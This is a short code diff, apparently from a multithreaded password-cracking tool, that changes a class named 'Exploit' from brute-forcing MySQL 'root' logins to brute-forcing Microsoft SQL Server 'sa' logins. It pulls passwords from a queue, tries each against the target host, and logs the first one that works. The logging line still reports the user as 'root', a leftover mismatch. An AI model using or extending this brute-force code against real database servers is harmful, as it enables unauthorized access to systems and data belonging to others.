@@ -1,5 +1,5 @@
 # coding:utf-8
-import MySQLdb
+import pymssql
 import threading
 from Libs.methods import *
 from Libs.glo import *
@@ -23,7 +23,7 @@ class Exploit(threading.Thread):
             else:
                 pwd = self.q_pwdCopy.get()
                 try:
-                    MySQLdb.connect(host=self.ip, user='root', passwd=pwd, port=self.port, connect_timeout=5)
+                    pymssql.connect(server=self.ip, user='sa', password=pwd, port=self.port, login_timeout=5)
                     logger.info('[+] [{}:{} --> u:{}   p:{}]'.format(self.ip, self.port, 'root', pwd))
                     break
                 except Exception as e:
